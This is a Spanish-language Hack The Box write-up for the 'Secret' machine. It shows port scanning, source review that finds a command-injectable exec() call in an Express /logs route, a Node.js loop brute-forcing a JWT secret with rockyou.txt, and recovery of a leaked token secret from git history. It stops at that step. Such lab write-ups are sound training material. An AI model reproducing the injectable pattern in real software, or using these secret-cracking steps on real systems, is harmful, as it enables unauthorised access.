<!doctype html><html lang=es><head><title>Secret | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una API que utiliza tokens JWT para la autenticación. Podemos descargar el proyecto y ver que es un repositorio de Git, y de las confirmaciones antiguas podemos extraer una clave secreta. Existe un binario SUID que lee archivos como root aunque solo muestra estadísticas del archivo, pero podemos matar el proceso y leer el coredump. Para comprometer esta máquina se necesitan conocimientos de pentesting web, enumeración de Git y procesos en Linux"><meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una API que utiliza tokens JWT para la autenticación. Podemos descargar el proyecto y ver que es un repositorio de Git, y de las confirmaciones antiguas podemos extraer una clave secreta. Existe un binario SUID que lee archivos como root aunque solo muestra estadísticas del archivo, pero podemos matar el proceso y leer el coredump. Para comprometer esta máquina se necesitan conocimientos de pentesting web, enumeración de Git y procesos en Linux"><meta name=twitter:description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una API que utiliza tokens JWT para la autenticación. Podemos descargar el proyecto y ver que es un repositorio de Git, y de las confirmaciones antiguas podemos extraer una clave secreta. Existe un binario SUID que lee archivos como root aunque solo muestra estadísticas del archivo, pero podemos matar el proceso y leer el coredump. Para comprometer esta máquina se necesitan conocimientos de pentesting web, enumeración de Git y procesos en Linux"><meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una API que utiliza tokens JWT para la autenticación. Podemos descargar el proyecto y ver que es un repositorio de Git, y de las confirmaciones antiguas podemos extraer una clave secreta. Existe un binario SUID que lee archivos como root aunque solo muestra estadísticas del archivo, pero podemos matar el proceso y leer el coredump. Para comprometer esta máquina se necesitan conocimientos de pentesting web, enumeración de Git y procesos en Linux"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Secret/Secret.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Secret/Secret.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Secret/Secret.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Secret"><meta property="og:title" content="Secret"><meta property="og:url" content="https://7rocky.github.io/htb/secret/"><meta itemprop=keywords content="git,api,express,suid,jwt,binary-exploitation,command-injection,static-code-analysis,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/secret/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/secret/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/secret/&text=Secret" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/secret/&title=Secret" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Secret</h1><time class="f6 mv4 dib tracked" datetime=2022-03-26T00:00:00+01:00>26 / 03 / 2022</time></header><div class=htb-image><img alt=Secret src=/images/HTB/Secret/Secret.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/git title=Git>Git</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/api title=API>API</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/express title="Express JS">Express JS</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/suid title="Binario SUID">Binario SUID</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/jwt title="JSON Web Token">JSON Web Token</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/binary-exploitation title="Explotación de binarios">Explotación de binarios</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/static-code-analysis title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#análisis-de-código-estático>Análisis de código estático</a></li><li><a href=#enumeración-del-proyecto-git>Enumeración del proyecto Git</a></li><li><a href=#acceso-a-la-máquina>Acceso a la máquina</a></li><li><a href=#encontrando-un-binario-suid>Encontrando un binario SUID</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Fácil</li><li><strong>Dirección IP</strong>: 10.10.11.120</li><li><strong>Fecha</strong>: 30 / 10 / 2021</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.120 -p 22,80,3000
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.120
</span></span><span style=display:flex><span>Host is up (0.063s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
</span></span><span style=display:flex><span>|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
</span></span><span style=display:flex><span>|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
</span></span><span style=display:flex><span>80/tcp   open  http    nginx 1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: DUMB Docs
</span></span><span style=display:flex><span>3000/tcp open  http    Node.js (Express middleware)
</span></span><span style=display:flex><span>|_http-title: DUMB Docs
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 15.70 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 3000 (HTTP).</p><h2 id=enumeración-web>Enumeración web</h2><p>En el puerto 80 encontramos la documentación de una API. Exactamente lo mismo en el puerto 3000:</p><p><img src=/images/HTB/Secret/Secret-api.png alt="DUMB Api"></p><p>Leyendo la documentación, vemos que están utilizando Express JS y MongoDB en Node.js. Además, gestionan la autenticación y autorización mediante JSON Web Token (JWT):</p><p><img src=/images/HTB/Secret/Secret-api-docs1.png alt="DUMB Api Docs"></p><p>La API tiene las siguientes rutas: <code>/api/user/register</code>, <code>/api/user/login</code> y <code>/api/priv</code>. Algunos ejemplos de peticiones se muestran en las siguientes imágenes:</p><p><img src=/images/HTB/Secret/Secret-api-docs2.png alt="DUMB Api Docs"></p><p><img src=/images/HTB/Secret/Secret-api-docs3.png alt="DUMB Api Docs"></p><p><img src=/images/HTB/Secret/Secret-api-docs4.png alt="DUMB Api Docs"></p><p>Parece claro que el vector de ataque estará relacionado con JWT. Podemos intentar utilizar la contraseña mostrada en la documentación para iniciar sesión como <code>dasith</code>, pero no funciona.</p><h2 id=análisis-de-código-estático>Análisis de código estático</h2><p>En la página principal, podemos descargar un archivo ZIP con el código fuente de la API:</p><p><img src=/images/HTB/Secret/Secret-api-download.png alt="DUMB Api Download"></p><p>El archivo ZIP contiene los siguientes archivos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>cd</span> local-web

<span class=code-cyan>$</span> <span class=code-dark-green>tree</span> -I <span class=code-dark-yellow>'node_modules|public'</span>  
.
├── index.js
├── model
│   └── user.js
├── package-lock.json
├── package.json
├── routes
│   ├── auth.js
│   ├── forgot.js
│   ├── private.js
│   └── verifytoken.js
├── src
│   ├── routes
│   │   └── web.js
│   └── views
│       ├── 404.ejs
│       ├── doc.ejs
│       └── home.ejs
└── validations.js

5 directories, 13 files
</code></pre></div><p>Entonces podemos comenzar a analizar el código. Parece que hay otra ruta, pero solamente accesible por el usuario <code>theadmin</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>router.</span><span class=mtk8>get</span><span class=mtk1>(</span><span class=mtk4>'/logs'</span><span class=mtk1>,</span> <span class=mtk1>verifytoken,</span> <span class=mtk1>(</span><span class="mtk9 mtki">req</span><span class=mtk1>,</span> <span class="mtk9 mtki">res</span><span class=mtk1>)</span> <span class="mtk7 mtki">=&gt;</span> <span class=mtk1>{</span>  
  <span class="mtk7 mtki">const</span> <span class=mtk1>file</span> <span class=mtk5>=</span> <span class="mtk9 mtki">req</span><span class=mtk1>.query.file</span>
  <span class="mtk7 mtki">const</span> <span class=mtk1>userinfo</span> <span class=mtk5>=</span> <span class=mtk1>{</span> <span class=mtk1>name</span><span class=mtk1>:</span> <span class="mtk9 mtki">req</span><span class=mtk1>.user</span> <span class=mtk1>}</span>
  <span class="mtk7 mtki">const</span> <span class=mtk1>name</span> <span class=mtk5>=</span> <span class=mtk1>userinfo</span><span class=mtk1>.</span><span class=mtk1>name</span><span class=mtk1>.name</span>

  <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>name</span> <span class=mtk5>===</span> <span class=mtk4>'theadmin'</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class="mtk7 mtki">const</span> <span class=mtk1>getLogs</span> <span class=mtk5>=</span> <span class=mtk4>`git</span> <span class=mtk4>log</span> <span class=mtk4>--oneline</span> <span class=mtk5>${</span><span class=mtk1>file</span><span class=mtk5>}</span><span class=mtk4>`</span>

    <span class=mtk8>exec</span><span class=mtk1>(</span><span class=mtk1>getLogs</span><span class=mtk1>,</span> <span class=mtk1>(</span><span class="mtk9 mtki">err</span><span class=mtk1>,</span> <span class="mtk9 mtki">output</span><span class=mtk1>)</span> <span class="mtk7 mtki">=&gt;</span> <span class=mtk1>{</span>
      <span class=mtk5>if</span> <span class=mtk1>(</span><span class="mtk9 mtki">err</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk5>return</span> <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>status</span><span class=mtk1>(</span><span class=mtk6>500</span><span class=mtk1>).</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk9 mtki">err</span><span class=mtk1>)</span>
      <span class=mtk1>}</span>

      <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>json</span><span class=mtk1>(</span><span class="mtk9 mtki">output</span><span class=mtk1>)</span>
    <span class=mtk1>})</span>
  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
    <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>json</span><span class=mtk1>({</span>
      <span class=mtk1>role</span><span class=mtk1>:</span> <span class=mtk1>{</span>
        <span class=mtk1>role</span><span class=mtk1>:</span> <span class=mtk4>'you</span> <span class=mtk4>are</span> <span class=mtk4>normal</span> <span class=mtk4>user'</span><span class=mtk1>,</span>
        <span class=mtk1>desc</span><span class=mtk1>:</span> <span class=mtk1>userinfo</span><span class=mtk1>.</span><span class=mtk1>name</span><span class=mtk1>.name</span>
      <span class=mtk1>}</span>
    <span class=mtk1>})</span>
  <span class=mtk1>}</span>
<span class=mtk1>})</span>
</code></pre></div><p>Aquí vemos que el parámetro <code>file</code> es vulnerable a inyección de comandos, ya que se inserta en un comando de sistema sin ninguna validación. Este será el camino dpara acceder a la máquina, pero se necesita un <em>token</em> JWT válido para el usuario <code>theadmin</code>.</p><p>Por otro lado, existe una validación exhaustiva de las tres rutas mencionadas anteriormente:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>//</span> <span class=mtk3>register</span> <span class=mtk3>validation</span>

<span class="mtk7 mtki">const</span> <span class=mtk8>registerValidation</span> <span class=mtk5>=</span> <span class="mtk9 mtki">data</span> <span class="mtk7 mtki">=&gt;</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">const</span> <span class=mtk1>schema</span> <span class=mtk5>=</span> <span class=mtk1>{</span>
    <span class=mtk1>name</span><span class=mtk1>:</span> <span class=mtk1>Joi.</span><span class=mtk8>string</span><span class=mtk1>().</span><span class=mtk8>min</span><span class=mtk1>(</span><span class=mtk6>6</span><span class=mtk1>).</span><span class=mtk8>required</span><span class=mtk1>(),</span>
    <span class=mtk1>email</span><span class=mtk1>:</span> <span class=mtk1>Joi.</span><span class=mtk8>string</span><span class=mtk1>().</span><span class=mtk8>min</span><span class=mtk1>(</span><span class=mtk6>6</span><span class=mtk1>).</span><span class=mtk8>required</span><span class=mtk1>().</span><span class=mtk8>email</span><span class=mtk1>(),</span>  
    <span class=mtk1>password</span><span class=mtk1>:</span> <span class=mtk1>Joi.</span><span class=mtk8>string</span><span class=mtk1>().</span><span class=mtk8>min</span><span class=mtk1>(</span><span class=mtk6>6</span><span class=mtk1>).</span><span class=mtk8>required</span><span class=mtk1>()</span>
  <span class=mtk1>}</span>

  <span class=mtk5>return</span> <span class=mtk1>Joi.</span><span class=mtk8>validate</span><span class=mtk1>(</span><span class="mtk9 mtki">data</span><span class=mtk1>,</span> <span class=mtk1>schema</span><span class=mtk1>)</span>
<span class=mtk1>}</span>

<span class=mtk3>//</span> <span class=mtk3>login</span> <span class=mtk3>validation</span>

<span class="mtk7 mtki">const</span> <span class=mtk8>loginValidation</span> <span class=mtk5>=</span> <span class="mtk9 mtki">data</span> <span class="mtk7 mtki">=&gt;</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">const</span> <span class=mtk1>schema2</span> <span class=mtk5>=</span> <span class=mtk1>{</span>
    <span class=mtk1>email</span><span class=mtk1>:</span> <span class=mtk1>Joi.</span><span class=mtk8>string</span><span class=mtk1>().</span><span class=mtk8>min</span><span class=mtk1>(</span><span class=mtk6>6</span><span class=mtk1>).</span><span class=mtk8>required</span><span class=mtk1>().</span><span class=mtk8>email</span><span class=mtk1>(),</span>
    <span class=mtk1>password</span><span class=mtk1>:</span> <span class=mtk1>Joi.</span><span class=mtk8>string</span><span class=mtk1>().</span><span class=mtk8>min</span><span class=mtk1>(</span><span class=mtk6>6</span><span class=mtk1>).</span><span class=mtk8>required</span><span class=mtk1>()</span>
  <span class=mtk1>}</span>

  <span class=mtk5>return</span> <span class=mtk1>Joi.</span><span class=mtk8>validate</span><span class=mtk1>(</span><span class="mtk9 mtki">data</span><span class=mtk1>,</span> <span class=mtk1>schema2</span><span class=mtk1>)</span>
<span class=mtk1>}</span>
</code></pre></div><p>Por este motivo, no se puede realizar ningún tipo de inyección NoSQL, ya que los parámetros están correctamente validados. Y finalmente, la implementación de JWT es correcta.</p><p>En el proyecto podemos ver un archivo <code>.env</code> con la siguiente imformación:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>DB_CONNECT</span> <span class=mtk5>=</span> <span class=mtk4>'mongodb://127.0.0.1:27017/auth-web'</span>  
<span class=mtk1>TOKEN_SECRET</span> <span class=mtk5>=</span> <span class=mtk1>secret</span>
</code></pre></div><p>La variable <code>TOKEN_SECRET</code> se utiliza para firmar los <em>tokens</em> JWT. Podemos utilizarlo en la página web, pero no es válido.</p><p>Entonces, podemos intentar hacer un ataque de fuerza bruta al secreto utilizando el archivo <code>rockyou.txt</code> desde Node.js. Curiosamente, si se utiliza el <em>token</em> JWT que se muestra en la documentación de la API, el secreto es <code>example</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>node</span>
&gt; const fs = require('fs')
<span class=code-grey>undefined</span>
&gt; const jwt = require('jsonwebtoken')
<span class=code-grey>undefined</span>
&gt; for (const password of fs.readFileSync('rockyou.txt').toString().split('\n')) { try { jwt.verify('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg', password); console.log(password); break } catch (err) { } }  
example
<span class=code-grey>undefined</span>
</code></pre></div><p>Pero este secreto <code>example</code> no funciona en la página web. Si tratamos de tralizar fuerza bruta a un <em>token</em> JWT generado por la página web al registrar un usuario e iniciar sesión, no conseguimos el secreto (lo cual quiere decir que no está en <code>rockyou.txt</code>).</p><h2 id=enumeración-del-proyecto-git>Enumeración del proyecto Git</h2><p>En el archivo ZIP, hay también una carpeta <code>.git</code>. Esto se debe a que el proyecto está controlado por un repositorio de Git. Entonces, podemos tratar de ver si hay información sensible en <em>commits</em> anteriores. Por ejemplo, podemos ver el histórico de <em>commits</em> de Git:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>git</span> log
<span class=code-dark-yellow>commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (<span class=code-cyan>HEAD -&gt;</span> <span class=code-green>master</span>)</span>  
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

<span class=code-dark-yellow>commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</span>
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

<span class=code-dark-yellow>commit de0a46b5107a2f4d26e348303e76d85ae4870934</span>
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

<span class=code-dark-yellow>commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb</span>
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

<span class=code-dark-yellow>commit 3a367e735ee76569664bf7754eaaade7c735d702</span>
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

<span class=code-dark-yellow>commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8</span>
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
</code></pre></div><p>Vemos que el archivo <code>.env</code> fue modificado en el <em>commit</em> que empieza por <code>67d8da7a</code>. Entonces, podemos ver las diferencias existentes entre el <em>commit</em> anterior (el que empieza por <code>de0a46b5</code>) y la versión actual del proyecto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>git</span> diff -p de0a46b5 | <span class=code-dark-green>grep</span> TOKEN_SECRET
-<span class=code-red>TOKEN_SECRET</span> = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE  
+<span class=code-red>TOKEN_SECRET</span> = secret
